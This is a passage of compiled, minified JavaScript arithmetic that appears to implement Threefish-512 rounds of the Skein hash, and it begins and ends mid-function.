            wa = (wa | y) ^ Q;
            _ = wb(aa | 0, _ | 0, ga | 0, sa | 0) | 0;
            aa = y;
            za = zb(ga | 0, sa | 0, 17) | 0;
            ia = y;
            sa = yb(ga | 0, sa | 0, 47) | 0;
            sa = _ ^ (za | sa);
            ia = aa ^ (ia | y);
            va = wb(ua | 0, va | 0, Ia | 0, wa | 0) | 0;
            ua = y;
            za = zb(Ia | 0, wa | 0, 49) | 0;
            ga = y;
            wa = yb(Ia | 0, wa | 0, 15) | 0;
            wa = (za | wa) ^ va;
            ga = (ga | y) ^ ua;
            Q = wb(ka | 0, ya | 0, Ha | 0, Q | 0) | 0;
            Ha = y;
            za = zb(ka | 0, ya | 0, 36) | 0;
            Ia = y;
            ya = yb(ka | 0, ya | 0, 28) | 0;
            ya = (za | ya) ^ Q;
            Ia = (Ia | y) ^ Ha;
            Pa = wb(Ga | 0, xa | 0, Fa | 0, Pa | 0) | 0;
            Fa = y;
            za = zb(Ga | 0, xa | 0, 39) | 0;
            ka = y;
            xa = yb(Ga | 0, xa | 0, 25) | 0;
            xa = (za | xa) ^ Pa;
            ka = (ka | y) ^ Fa;
            ua = wb(sa | 0, ia | 0, va | 0, ua | 0) | 0;
            va = y;
            za = zb(sa | 0, ia | 0, 44) | 0;
            Ga = y;
            ia = yb(sa | 0, ia | 0, 20) | 0;
            Ga = (Ga | y) ^ va;
            Ha = wb(xa | 0, ka | 0, Q | 0, Ha | 0) | 0;
            Q = y;
            sa = zb(xa | 0, ka | 0, 9) | 0;
            ea = y;
            ka = yb(xa | 0, ka | 0, 55) | 0;
            ea = (ea | y) ^ Q;
            Fa = wb(ya | 0, Ia | 0, Pa | 0, Fa | 0) | 0;
            Pa = y;
            xa = zb(ya | 0, Ia | 0, 54) | 0;
            Ca = y;
            Ia = yb(ya | 0, Ia | 0, 10) | 0;
            Ca = (Ca | y) ^ Pa;
            aa = wb(_ | 0, aa | 0, wa | 0, ga | 0) | 0;
            _ = y;
            ya = zb(wa | 0, ga | 0, 56) | 0;
            ca = y;
            ga = yb(wa | 0, ga | 0, 8) | 0;
            ca = (ca | y) ^ _;
            Q = wb(Ha | 0, Q | 0, t | 0, u | 0) | 0;
            wa = y;
            Ga = wb((za | ia) ^ ua | 0, Ga | 0, v | 0, w | 0) | 0;
            ia = y;
            Pa = wb(Fa | 0, Pa | 0, x | 0, z | 0) | 0;
            za = y;
            ca = wb((ya | ga) ^ aa | 0, ca | 0, a | 0, g | 0) | 0;
            ga = y;
            _ = wb(aa | 0, _ | 0, h | 0, i | 0) | 0;
            aa = y;
            Ca = wb((xa | Ia) ^ Fa | 0, Ca | 0, S | 0, U | 0) | 0;
            Fa = y;
            Ia = wb(l | 0, m | 0, ma | 0, oa | 0) | 0;
            xa = y;
            va = wb(ua | 0, va | 0, Ia | 0, xa | 0) | 0;
            ua = y;
            ya = wb(qa | 0, ra | 0, 1, 0) | 0;
            ea = wb(ya | 0, y | 0, (sa | ka) ^ Ha | 0, ea | 0) | 0;
            Ha = y;
            wa = wb(Q | 0, wa | 0, Ga | 0, ia | 0) | 0;
            Q = y;
            ka = zb(Ga | 0, ia | 0, 39) | 0;
            sa = y;
            ia = yb(Ga | 0, ia | 0, 25) | 0;
            ia = (ka | ia) ^ wa;
            sa = (sa | y) ^ Q;
            za = wb(Pa | 0, za | 0, ca | 0, ga | 0) | 0;
            Pa = y;
            ka = zb(ca | 0, ga | 0, 30) | 0;
            Ga = y;
            ga = yb(ca | 0, ga | 0, 34) | 0;
            ga = (ka | ga) ^ za;
            Ga = (Ga | y) ^ Pa;
            aa = wb(_ | 0, aa | 0, Ca | 0, Fa | 0) | 0;
            _ = y;
            ka = zb(Ca | 0, Fa | 0, 34) | 0;
            ca = y;
            Fa = yb(Ca | 0, Fa | 0, 30) | 0;
            Fa = (ka | Fa) ^ aa;
            ca = (ca | y) ^ _;
            ua = wb(va | 0, ua | 0, ea | 0, Ha | 0) | 0;
            va = y;
            ka = zb(ea | 0, Ha | 0, 24) | 0;
            Ca = y;
            Ha = yb(ea | 0, Ha | 0, 40) | 0;
            Ha = (ka | Ha) ^ ua;
            Ca = (Ca | y) ^ va;
            Pa = wb(ia | 0, sa | 0, za | 0, Pa | 0) | 0;
            za = y;
            ka = zb(ia | 0, sa | 0, 13) | 0;
            ea = y;
            sa = yb(ia | 0, sa | 0, 51) | 0;
            sa = (ka | sa) ^ Pa;
            ea = (ea | y) ^ za;
            _ = wb(Ha | 0, Ca | 0, aa | 0, _ | 0) | 0;
            aa = y;
            ka = zb(Ha | 0, Ca | 0, 50) | 0;
            ia = y;
            Ca = yb(Ha | 0, Ca | 0, 14) | 0;
            Ca = (ka | Ca) ^ _;
            ia = (ia | y) ^ aa;
            va = wb(Fa | 0, ca | 0, ua | 0, va | 0) | 0;
            ua = y;
            ka = zb(Fa | 0, ca | 0, 10) | 0;
            Ha = y;
            ca = yb(Fa | 0, ca | 0, 54) | 0;
            ca = (ka | ca) ^ va;
            Ha = (Ha | y) ^ ua;
            Q = wb(wa | 0, Q | 0, ga | 0, Ga | 0) | 0;
            wa = y;
            ka = zb(ga | 0, Ga | 0, 17) | 0;
            Fa = y;
            Ga = yb(ga | 0, Ga | 0, 47) | 0;
            Ga = (ka | Ga) ^ Q;
            Fa = (Fa | y) ^ wa;
            aa = wb(_ | 0, aa | 0, sa | 0, ea | 0) | 0;
            _ = y;
            ka = zb(sa | 0, ea | 0, 25) | 0;
            ga = y;
            ea = yb(sa | 0, ea | 0, 39) | 0;
            ea = (ka | ea) ^ aa;
            ga = (ga | y) ^ _;
            ua = wb(va | 0, ua | 0, Ga | 0, Fa | 0) | 0;
            va = y;
            ka = zb(Ga | 0, Fa | 0, 29) | 0;
            sa = y;
            Fa = yb(Ga | 0, Fa | 0, 35) | 0;
            Fa = (ka | Fa) ^ ua;
            sa = (sa | y) ^ va;
            wa = wb(ca | 0, Ha | 0, Q | 0, wa | 0) | 0;
            Q = y;
            ka = zb(ca | 0, Ha | 0, 39) | 0;
            Ga = y;
            Ha = yb(ca | 0, Ha | 0, 25) | 0;
            Ha = (ka | Ha) ^ wa;
            Ga = (Ga | y) ^ Q;
            za = wb(Ca | 0, ia | 0, Pa | 0, za | 0) | 0;
            Pa = y;
            ka = zb(Ca | 0, ia | 0, 43) | 0;
            ca = y;
            ia = yb(Ca | 0, ia | 0, 21) | 0;
            ia = (ka | ia) ^ za;
            ca = (ca | y) ^ Pa;
            va = wb(ea | 0, ga | 0, ua | 0, va | 0) | 0;
            ua = y;
            ka = zb(ea | 0, ga | 0, 8) | 0;
            Ca = y;
            ga = yb(ea | 0, ga | 0, 56) | 0;
            Ca = (Ca | y) ^ ua;
            Q = wb(ia | 0, ca | 0, wa | 0, Q | 0) | 0;
            wa = y;
            ea = zb(ia | 0, ca | 0, 35) | 0;
            ya = y;
            ca = yb(ia | 0, ca | 0, 29) | 0;
            ya = (ya | y) ^ wa;
            Pa = wb(Ha | 0, Ga | 0, za | 0, Pa | 0) | 0;
            za = y;
            ia = zb(Ha | 0, Ga | 0, 56) | 0;
            Aa = y;
            Ga = yb(Ha | 0, Ga | 0, 8) | 0;
            Aa = (Aa | y) ^ za;
            _ = wb(aa | 0, _ | 0, Fa | 0, sa | 0) | 0;
            aa = y;
            Ha = zb(Fa | 0, sa | 0, 22) | 0;
            ta = y;
            sa = yb(Fa | 0, sa | 0, 42) | 0;
            ta = (ta | y) ^ aa;
            wa = wb(Q | 0, wa | 0, v | 0, w | 0) | 0;
            Fa = y;
            Ca = wb((ka | ga) ^ va | 0, Ca | 0, x | 0, z | 0) | 0;
            ga = y;
            za = wb(Pa | 0, za | 0, a | 0, g | 0) | 0;
            ka = y;
            ta = wb((Ha | sa) ^ _ | 0, ta | 0, h | 0, i | 0) | 0;
            sa = y;
            aa = wb(_ | 0, aa | 0, j | 0, k | 0) | 0;
            _ = y;
            Aa = wb((ia | Ga) ^ Pa | 0, Aa | 0, Ia | 0, xa | 0) | 0;
            Pa = y;
            Ga = wb(qa | 0, ra | 0, p | 0, q | 0) | 0;
            ia = y;
            ua = wb(va | 0, ua | 0, Ga | 0, ia | 0) | 0;
            va = y;
            Ha = wb(r | 0, s | 0, 2, 0) | 0;
            ya = wb(Ha | 0, y | 0, (ea | ca) ^ Q | 0, ya | 0) | 0;
            Q = y;
            Fa = wb(wa | 0, Fa | 0, Ca | 0, ga | 0) | 0;
            wa = y;
            ca = zb(Ca | 0, ga | 0, 46) | 0;
            ea = y;
            ga = yb(Ca | 0, ga | 0, 18) | 0;
            ga = (ca | ga) ^ Fa;
            ea = (ea | y) ^ wa;
            ka = wb(za | 0, ka | 0, ta | 0, sa | 0) | 0;
            za = y;
            ca = zb(ta | 0, sa | 0, 36) | 0;
            Ca = y;
            sa = yb(ta | 0, sa | 0, 28) | 0;
            sa = (ca | sa) ^ ka;
            Ca = (Ca | y) ^ za;
            _ = wb(aa | 0, _ | 0, Aa | 0, Pa | 0) | 0;
            aa = y;
            ca = zb(Aa | 0, Pa | 0, 19) | 0;
            ta = y;
            Pa = yb(Aa | 0, Pa | 0, 45) | 0;
            Pa = (ca | Pa) ^ _;
            ta = (ta | y) ^ aa;
            va = wb(ua | 0, va | 0, ya | 0, Q | 0) | 0;
            ua = y;
            ca = zb(ya | 0, Q | 0, 37) | 0;
            Aa = y;
            Q = yb(ya | 0, Q | 0, 27) | 0;
            Q = (ca | Q) ^ va;
            Aa = (Aa | y) ^ ua;
            za = wb(ga | 0, ea | 0, ka | 0, za | 0) | 0;
            ka = y;
            ca = zb(ga | 0, ea | 0, 33) | 0;
            ya = y;
            ea = yb(ga | 0, ea | 0, 31) | 0;
            ea = (ca | ea) ^ za;
            ya = (ya | y) ^ ka;
            aa = wb(Q | 0, Aa | 0, _ | 0, aa | 0) | 0;
            _ = y;
            ca = zb(Q | 0, Aa | 0, 27) | 0;
            ga = y;
            Aa = yb(Q | 0, Aa | 0, 37) | 0;
            Aa = (ca | Aa) ^ aa;
            ga = (ga | y) ^ _;
            ua = wb(Pa | 0, ta | 0, va | 0, ua | 0) | 0;
            va = y;
            ca = zb(Pa | 0, ta | 0, 14) | 0;
            Q = y;
            ta = yb(Pa | 0, ta | 0, 50) | 0;
            ta = (ca | ta) ^ ua;
            Q = (Q | y) ^ va;
            wa = wb(Fa | 0, wa | 0, sa | 0, Ca | 0) | 0;
            Fa = y;
            ca = zb(sa | 0, Ca | 0, 42) | 0;
            Pa = y;
            Ca = yb(sa | 0, Ca | 0, 22) | 0;
            Ca = (ca | Ca) ^ wa;
            Pa = (Pa | y) ^ Fa;
            _ = wb(aa | 0, _ | 0, ea | 0, ya | 0) | 0;
            aa = y;
            ca = zb(ea | 0, ya | 0, 17) | 0;
            sa = y;
            ya = yb(ea | 0, ya | 0, 47) | 0;
            ya = (ca | ya) ^ _;
            sa = (sa | y) ^ aa;
            va = wb(ua | 0, va | 0, Ca | 0, Pa | 0) | 0;
            ua = y;
            ca = zb(Ca | 0, Pa | 0, 49) | 0;
            ea = y;
            Pa = yb(Ca | 0, Pa | 0, 15) | 0;
            Pa = (ca | Pa) ^ va;
            ea = (ea | y) ^ ua;
            Fa = wb(ta | 0, Q | 0, wa | 0, Fa | 0) | 0;
            wa = y;
            ca = zb(ta | 0, Q | 0, 36) | 0;
            Ca = y;
            Q = yb(ta | 0, Q | 0, 28) | 0;
            Q = (ca | Q) ^ Fa;
            Ca = (Ca | y) ^ wa;
            ka = wb(Aa | 0, ga | 0, za | 0, ka | 0) | 0;
            za = y;
            ca = zb(Aa | 0, ga | 0, 39) | 0;
            ta = y;
            ga = yb(Aa | 0, ga | 0, 25) | 0;
            ga = (ca | ga) ^ ka;
            ta = (ta | y) ^ za;
            ua = wb(ya | 0, sa | 0, va | 0, ua | 0) | 0;
            va = y;
            ca = zb(ya | 0, sa | 0, 44) | 0;
            Aa = y;
            sa = yb(ya | 0, sa | 0, 20) | 0;
            Aa = (Aa | y) ^ va;
            wa = wb(ga | 0, ta | 0, Fa | 0, wa | 0) | 0;
            Fa = y;
            ya = zb(ga | 0, ta | 0, 9) | 0;
            Ha = y;
            ta = yb(ga | 0, ta | 0, 55) | 0;
            Ha = (Ha | y) ^ Fa;
            za = wb(Q | 0, Ca | 0, ka | 0, za | 0) | 0;
            ka = y;
            ga = zb(Q | 0, Ca | 0, 54) | 0;
            Da = y;
            Ca = yb(Q | 0, Ca | 0, 10) | 0;
            Da = (Da | y) ^ ka;
            aa = wb(_ | 0, aa | 0, Pa | 0, ea | 0) | 0;
            _ = y;
            Q = zb(Pa | 0, ea | 0, 56) | 0;
            Qa = y;
            ea = yb(Pa | 0, ea | 0, 8) | 0;
            Qa = (Qa | y) ^ _;
            Fa = wb(wa | 0, Fa | 0, x | 0, z | 0) | 0;
            Pa = y;
            Aa = wb((ca | sa) ^ ua | 0, Aa | 0, a | 0, g | 0) | 0;
            sa = y;
            ka = wb(za | 0, ka | 0, h | 0, i | 0) | 0;
            ca = y;
            Qa = wb((Q | ea) ^ aa | 0, Qa | 0, j | 0, k | 0) | 0;
            ea = y;
            _ = wb(aa | 0, _ | 0, l | 0, m | 0) | 0;
            aa = y;
            Da = wb((ga | Ca) ^ za | 0, Da | 0, Ga | 0, ia | 0) | 0;
            za = y;
            Ca = wb(r | 0, s | 0, n | 0, o | 0) | 0;
            ga = y;
            va = wb(ua | 0, va | 0, Ca | 0, ga | 0) | 0;
            ua = y;
            Q = wb(t | 0, u | 0, 3, 0) | 0;
            Ha = wb(Q | 0, y | 0, (ya | ta) ^ wa | 0, Ha | 0) | 0;
            wa = y;
            Pa = wb(Fa | 0, Pa | 0, Aa | 0, sa | 0) | 0;
            Fa = y;
            ta = zb(Aa | 0, sa | 0, 39) | 0;
            ya = y;
            sa = yb(Aa | 0, sa | 0, 25) | 0;
            sa = (ta | sa) ^ Pa;
            ya = (ya | y) ^ Fa;
            ca = wb(ka | 0, ca | 0, Qa | 0, ea | 0) | 0;
            ka = y;
            ta = zb(Qa | 0, ea | 0, 30) | 0;
            Aa = y;
            ea = yb(Qa | 0, ea | 0, 34) | 0;
            ea = (ta | ea) ^ ca;
            Aa = (Aa | y) ^ ka;
            aa = wb(_ | 0, aa | 0, Da | 0, za | 0) | 0;
            _ = y;
            ta = zb(Da | 0, za | 0, 34) | 0;
            Qa = y;
            za = yb(Da | 0, za | 0, 30) | 0;
            za = (ta | za) ^ aa;
            Qa = (Qa | y) ^ _;
            ua = wb(va | 0, ua | 0, Ha | 0, wa | 0) | 0;
            va = y;
            ta = zb(Ha | 0, wa | 0, 24) | 0;
            Da = y;
            wa = yb(Ha | 0, wa | 0, 40) | 0;
            wa = (ta | wa) ^ ua;
            Da = (Da | y) ^ va;
            ka = wb(sa | 0, ya | 0, ca | 0, ka | 0) | 0;
            ca = y;
            ta = zb(sa | 0, ya | 0, 13) | 0;
            Ha = y;
            ya = yb(sa | 0, ya | 0, 51) | 0;
            ya = (ta | ya) ^ ka;
            Ha = (Ha | y) ^ ca;
            _ = wb(wa | 0, Da | 0, aa | 0, _ | 0) | 0;
            aa = y;
            ta = zb(wa | 0, Da | 0, 50) | 0;
            sa = y;
            Da = yb(wa | 0, Da | 0, 14) | 0;
            Da = (ta | Da) ^ _;
            sa = (sa | y) ^ aa;
            va = wb(za | 0, Qa | 0, ua | 0, va | 0) | 0;
            ua = y;
            ta = zb(za | 0, Qa | 0, 10) | 0;
            wa = y;
            Qa = yb(za | 0, Qa | 0, 54) | 0;
            Qa = (ta | Qa) ^ va;
            wa = (wa | y) ^ ua;
            Fa = wb(Pa | 0, Fa | 0, ea | 0, Aa | 0) | 0;
            Pa = y;
            ta = zb(ea | 0, Aa | 0, 17) | 0;
            za = y;
            Aa = yb(ea | 0, Aa | 0, 47) | 0;
            Aa = (ta | Aa) ^ Fa;
            za = (za | y) ^ Pa;
            aa = wb(_ | 0, aa | 0, ya | 0, Ha | 0) | 0;
            _ = y;
            ta = zb(ya | 0, Ha | 0, 25) | 0;
            ea = y;
            Ha = yb(ya | 0, Ha | 0, 39) | 0;
            Ha = (ta | Ha) ^ aa;
            ea = (ea | y) ^ _;
            ua = wb(va | 0, ua | 0, Aa | 0, za | 0) | 0;
            va = y;
            ta = zb(Aa | 0, za | 0, 29) | 0;
            ya = y;
            za = yb(Aa | 0, za | 0, 35) | 0;
            za = (ta | za) ^ ua;
            ya = (ya | y) ^ va;
            Pa = wb(Qa | 0, wa | 0, Fa | 0, Pa | 0) | 0;
            Fa = y;
            ta = zb(Qa | 0, wa | 0, 39) | 0;
            Aa = y;
            wa = yb(Qa | 0, wa | 0, 25) | 0;
            wa = (ta | wa) ^ Pa;
            Aa = (Aa | y) ^ Fa;
            ca = wb(Da | 0, sa | 0, ka | 0, ca | 0) | 0;
            ka = y;
            ta = zb(Da | 0, sa | 0, 43) | 0;
            Qa = y;
            sa = yb(Da | 0, sa | 0, 21) | 0;
            sa = (ta | sa) ^ ca;
            Qa = (Qa | y) ^ ka;
            va = wb(Ha | 0, ea | 0, ua | 0, va | 0) | 0;
            ua = y;
            ta = zb(Ha | 0, ea | 0, 8) | 0;
            Da = y;
            ea = yb(Ha | 0, ea | 0, 56) | 0;
            Da = (Da | y) ^ ua;
            Fa = wb(sa | 0, Qa | 0, Pa | 0, Fa | 0) | 0;
            Pa = y;
            Ha = zb(sa | 0, Qa | 0, 35) | 0;
            Q = y;
            Qa = yb(sa | 0, Qa | 0, 29) | 0;
            Q = (Q | y) ^ Pa;
            ka = wb(wa | 0, Aa | 0, ca | 0, ka | 0) | 0;
            ca = y;
            sa = zb(wa | 0, Aa | 0, 56) | 0;
            Ea = y;
            Aa = yb(wa | 0, Aa | 0, 8) | 0;
            Ea = (Ea | y) ^ ca;
            _ = wb(aa | 0, _ | 0, za | 0, ya | 0) | 0;
            aa = y;
            wa = zb(za | 0, ya | 0, 22) | 0;
            Oa = y;
            ya = yb(za | 0, ya | 0, 42) | 0;
            Oa = (Oa | y) ^ aa;
            Pa = wb(Fa | 0, Pa | 0, a | 0, g | 0) | 0;
            za = y;
            Da = wb((ta | ea) ^ va | 0, Da | 0, h | 0, i | 0) | 0;
            ea = y;
            ca = wb(ka | 0, ca | 0, j | 0, k | 0) | 0;
            ta = y;
            Oa = wb((wa | ya) ^ _ | 0, Oa | 0, l | 0, m | 0) | 0;
            ya = y;
            aa = wb(_ | 0, aa | 0, qa | 0, ra | 0) | 0;
            _ = y;
            Ea = wb((sa | Aa) ^ ka | 0, Ea | 0, Ca | 0, ga | 0) | 0;
            ka = y;
            Aa = wb(t | 0, u | 0, ma | 0, oa | 0) | 0;
            sa = y;
            ua = wb(va | 0, ua | 0, Aa | 0, sa | 0) | 0;
            va = y;
            wa = wb(v | 0, w | 0, 4, 0) | 0;
            Q = wb(wa | 0, y | 0, (Ha | Qa) ^ Fa | 0, Q | 0) | 0;
            Fa = y;
            za = wb(Pa | 0, za | 0, Da | 0, ea | 0) | 0;
            Pa = y;
            Qa = zb(Da | 0, ea | 0, 46) | 0;
            Ha = y;
            ea = yb(Da | 0, ea | 0, 18) | 0;
            ea = (Qa | ea) ^ za;
            Ha = (Ha | y) ^ Pa;
            ta = wb(ca | 0, ta | 0, Oa | 0, ya | 0) | 0;
            ca = y;
            Qa = zb(Oa | 0, ya | 0, 36) | 0;
            Da = y;
            ya = yb(Oa | 0, ya | 0, 28) | 0;
            ya = (Qa | ya) ^ ta;
            Da = (Da | y) ^ ca;
            _ = wb(aa | 0, _ | 0, Ea | 0, ka | 0) | 0;
            aa = y;
            Qa = zb(Ea | 0, ka | 0, 19) | 0;
            Oa = y;
            ka = yb(Ea | 0, ka | 0, 45) | 0;
            ka = (Qa | ka) ^ _;
            Oa = (Oa | y) ^ aa;
            va = wb(ua | 0, va | 0, Q | 0, Fa | 0) | 0;
            ua = y;
            Qa = zb(Q | 0, Fa | 0, 37) | 0;
            Ea = y;
            Fa = yb(Q | 0, Fa | 0, 27) | 0;
            Fa = (Qa | Fa) ^ va;
            Ea = (Ea | y) ^ ua;
            ca = wb(ea | 0, Ha | 0, ta | 0, ca | 0) | 0;
            ta = y;
            Qa = zb(ea | 0, Ha | 0, 33) | 0;
            Q = y;
            Ha = yb(ea | 0, Ha | 0, 31) | 0;
            Ha = (Qa | Ha) ^ ca;
            Q = (Q | y) ^ ta;
            aa = wb(Fa | 0, Ea | 0, _ | 0, aa | 0) | 0;
            _ = y;
            Qa = zb(Fa | 0, Ea | 0, 27) | 0;
            ea = y;
            Ea = yb(Fa | 0, Ea | 0, 37) | 0;
            Ea = (Qa | Ea) ^ aa;
            ea = (ea | y) ^ _;
            ua = wb(ka | 0, Oa | 0, va | 0, ua | 0) | 0;
            va = y;
            Qa = zb(ka | 0, Oa | 0, 14) | 0;
            Fa = y;
            Oa = yb(ka | 0, Oa | 0, 50) | 0;
            Oa = (Qa | Oa) ^ ua;
            Fa = (Fa | y) ^ va;
            Pa = wb(za | 0, Pa | 0, ya | 0, Da | 0) | 0;
            za = y;
            Qa = zb(ya | 0, Da | 0, 42) | 0;
            ka = y;
            Da = yb(ya | 0, Da | 0, 22) | 0;
            Da = (Qa | Da) ^ Pa;
            ka = (ka | y) ^ za;
            _ = wb(aa | 0, _ | 0, Ha | 0, Q | 0) | 0;
            aa = y;
            Qa = zb(Ha | 0, Q | 0, 17) | 0;
            ya = y;
            Q = yb(Ha | 0, Q | 0, 47) | 0;
            Q = (Qa | Q) ^ _;
            ya = (ya | y) ^ aa;
            va = wb(ua | 0, va | 0, Da | 0, ka | 0) | 0;
            ua = y;
            Qa = zb(Da | 0, ka | 0, 49) | 0;
            Ha = y;
            ka = yb(Da | 0, ka | 0, 15) | 0;
            ka = (Qa | ka) ^ va;
            Ha = (Ha | y) ^ ua;
            za = wb(Oa | 0, Fa | 0, Pa | 0, za | 0) | 0;
            Pa = y;
            Qa = zb(Oa | 0, Fa | 0, 36) | 0;
            Da = y;
            Fa = yb(Oa | 0, Fa | 0, 28) | 0;
            Fa = (Qa | Fa) ^ za;
            Da = (Da | y) ^ Pa;
            ta = wb(Ea | 0, ea | 0, ca | 0, ta | 0) | 0;
            ca = y;
            Qa = zb(Ea | 0, ea | 0, 39) | 0;
            Oa = y;
            ea = yb(Ea | 0, ea | 0, 25) | 0;
            ea = (Qa | ea) ^ ta;
            Oa = (Oa | y) ^ ca;
            ua = wb(Q | 0, ya | 0, va | 0, ua | 0) | 0;
            va = y;
            Qa = zb(Q | 0, ya | 0, 44) | 0;
            Ea = y;
            ya = yb(Q | 0, ya | 0, 20) | 0;
            Ea = (Ea | y) ^ va;
            Pa = wb(ea | 0, Oa | 0, za | 0, Pa | 0) | 0;
            za = y;
            Q = zb(ea | 0, Oa | 0, 9) | 0;
            wa = y;
            Oa = yb(ea | 0, Oa | 0, 55) | 0;
            wa = (wa | y) ^ za;
            ca = wb(Fa | 0, Da | 0, ta | 0, ca | 0) | 0;
            ta = y;
            ea = zb(Fa | 0, Da | 0, 54) | 0;
            Na = y;
            Da = yb(Fa | 0, Da | 0, 10) | 0;
            Na = (Na | y) ^ ta;
            aa = wb(_ | 0, aa | 0, ka | 0, Ha | 0) | 0;
            _ = y;
            Fa = zb(ka | 0, Ha | 0, 56) | 0;
            Ma = y;
            Ha = yb(ka | 0, Ha | 0, 8) | 0;
            Ma = (Ma | y) ^ _;
            za = wb(Pa | 0, za | 0, h | 0, i | 0) | 0;
            ka = y;
            Ea = wb((Qa | ya) ^ ua | 0, Ea | 0, j | 0, k | 0) | 0;
            ya = y;
            ta = wb(ca | 0, ta | 0, l | 0, m | 0) | 0;
            Qa = y;
            Ma = wb((Fa | Ha) ^ aa | 0, Ma | 0, qa | 0, ra | 0) | 0;
            Ha = y;
            _ = wb(aa | 0, _ | 0, r | 0, s | 0) | 0;
            aa = y;
            Na = wb((ea | Da) ^ ca | 0, Na | 0, Aa | 0, sa | 0) | 0;
            ca = y;
            Da = wb(v | 0, w | 0, p | 0, q | 0) | 0;
            ea = y;
            va = wb(ua | 0, va | 0, Da | 0, ea | 0) | 0;
            ua = y;
            Fa = wb(x | 0, z | 0, 5, 0) | 0;
            wa = wb(Fa | 0, y | 0, (Q | Oa) ^ Pa | 0, wa | 0) | 0;
            Pa = y;
            ka = wb(za | 0, ka | 0, Ea | 0, ya | 0) | 0;
            za = y;
            Oa = zb(Ea | 0, ya | 0, 39) | 0;
            Q = y;
            ya = yb(Ea | 0, ya | 0, 25) | 0;
            ya = (Oa | ya) ^ ka;
            Q = (Q | y) ^ za;
            Qa = wb(ta | 0, Qa | 0, Ma | 0, Ha | 0) | 0;
            ta = y;
            Oa = zb(Ma | 0, Ha | 0, 30) | 0;
            Ea = y;
            Ha = yb(Ma | 0, Ha | 0, 34) | 0;
            Ha = (Oa | Ha) ^ Qa;
            Ea = (Ea | y) ^ ta;
            aa = wb(_ | 0, aa | 0, Na | 0, ca | 0) | 0;
            _ = y;
            Oa = zb(Na | 0, ca | 0, 34) | 0;
            Ma = y;
            ca = yb(Na | 0, ca | 0, 30) | 0;
            ca = (Oa | ca) ^ aa;
            Ma = (Ma | y) ^ _;
            ua = wb(va | 0, ua | 0, wa | 0, Pa | 0) | 0;
            va = y;
            Oa = zb(wa | 0, Pa | 0, 24) | 0;
            Na = y;
            Pa = yb(wa | 0, Pa | 0, 40) | 0;
            Pa = (Oa | Pa) ^ ua;
            Na = (Na | y) ^ va;
            ta = wb(ya | 0, Q | 0, Qa | 0, ta | 0) | 0;
            Qa = y;
            Oa = zb(ya | 0, Q | 0, 13) | 0;
            wa = y;
            Q = yb(ya | 0, Q | 0, 51) | 0;
            Q = (Oa | Q) ^ ta;
            wa = (wa | y) ^ Qa;
            _ = wb(Pa | 0, Na | 0, aa | 0, _ | 0) | 0;
            aa = y;
            Oa = zb(Pa | 0, Na | 0, 50) | 0;
            ya = y;
            Na = yb(Pa | 0, Na | 0, 14) | 0;
            Na = (Oa | Na) ^ _;
            ya = (ya | y) ^ aa;
            va = wb(ca | 0, Ma | 0, ua | 0, va | 0) | 0;
            ua = y;
            Oa = zb(ca | 0, Ma | 0, 10) | 0;
            Pa = y;
            Ma = yb(ca | 0, Ma | 0, 54) | 0;
            Ma = (Oa | Ma) ^ va;
            Pa = (Pa | y) ^ ua;
            za = wb(ka | 0, za | 0, Ha | 0, Ea | 0) | 0;
            ka = y;
            Oa = zb(Ha | 0, Ea | 0, 17) | 0;
            ca = y;
            Ea = yb(Ha | 0, Ea | 0, 47) | 0;
            Ea = (Oa | Ea) ^ za;
            ca = (ca | y) ^ ka;
            aa = wb(_ | 0, aa | 0, Q | 0, wa | 0) | 0;
            _ = y;
            Oa = zb(Q | 0, wa | 0, 25) | 0;
            Ha = y;
            wa = yb(Q | 0, wa | 0, 39) | 0;
            wa = (Oa | wa) ^ aa;
            Ha = (Ha | y) ^ _;
            ua = wb(va | 0, ua | 0, Ea | 0, ca | 0) | 0;
            va = y;
            Oa = zb(Ea | 0, ca | 0, 29) | 0;
            Q = y;
            ca = yb(Ea | 0, ca | 0, 35) | 0;
            ca = (Oa | ca) ^ ua;
            Q = (Q | y) ^ va;
            ka = wb(Ma | 0, Pa | 0, za | 0, ka | 0) | 0;
            za = y;
            Oa = zb(Ma | 0, Pa | 0, 39) | 0;
            Ea = y;
            Pa = yb(Ma | 0, Pa | 0, 25) | 0;
            Pa = (Oa | Pa) ^ ka;
            Ea = (Ea | y) ^ za;
            Qa = wb(Na | 0, ya | 0, ta | 0, Qa | 0) | 0;
            ta = y;
            Oa = zb(Na | 0, ya | 0, 43) | 0;
            Ma = y;
            ya = yb(Na | 0, ya | 0, 21) | 0;
            ya = (Oa | ya) ^ Qa;
            Ma = (Ma | y) ^ ta;
            va = wb(wa | 0, Ha | 0, ua | 0, va | 0) | 0;
            ua = y;
            Oa = zb(wa | 0, Ha | 0, 8) | 0;
            Na = y;
            Ha = yb(wa | 0, Ha | 0, 56) | 0;
            Na = (Na | y) ^ ua;
            za = wb(ya | 0, Ma | 0, ka | 0, za | 0) | 0;
            ka = y;
            wa = zb(ya | 0, Ma | 0, 35) | 0;
            Fa = y;
            Ma = yb(ya | 0, Ma | 0, 29) | 0;
            Fa = (Fa | y) ^ ka;
            ta = wb(Pa | 0, Ea | 0, Qa | 0, ta | 0) | 0;
            Qa = y;
            ya = zb(Pa | 0, Ea | 0, 56) | 0;
            La = y;
            Ea = yb(Pa | 0, Ea | 0, 8) | 0;
            La = (La | y) ^ Qa;
            _ = wb(aa | 0, _ | 0, ca | 0, Q | 0) | 0;
            aa = y;
            Pa = zb(ca | 0, Q | 0, 22) | 0;
            Ka = y;
            Q = yb(ca | 0, Q | 0, 42) | 0;
            Ka = (Ka | y) ^ aa;
            ka = wb(za | 0, ka | 0, j | 0, k | 0) | 0;
            ca = y;
            Na = wb((Oa | Ha) ^ va | 0, Na | 0, l | 0, m | 0) | 0;
            Ha = y;
            Qa = wb(ta | 0, Qa | 0, qa | 0, ra | 0) | 0;
            Oa = y;
            Ka = wb((Pa | Q) ^ _ | 0, Ka | 0, r | 0, s | 0) | 0;
            Q = y;
            aa = wb(_ | 0, aa | 0, t | 0, u | 0) | 0;
            _ = y;
            La = wb((ya | Ea) ^ ta | 0, La | 0, Da | 0, ea | 0) | 0;
            ta = y;
            Ea = wb(x | 0, z | 0, n | 0, o | 0) | 0;
            ya = y;
            ua = wb(va | 0, ua | 0, Ea | 0, ya | 0) | 0;
            va = y;
            Pa = wb(a | 0, g | 0, 6, 0) | 0;
            Fa = wb(Pa | 0, y | 0, (wa | Ma) ^ za | 0, Fa | 0) | 0;
            za = y;
            ca = wb(ka | 0, ca | 0, Na | 0, Ha | 0) | 0;
            ka = y;
            Ma = zb(Na | 0, Ha | 0, 46) | 0;
            wa = y;
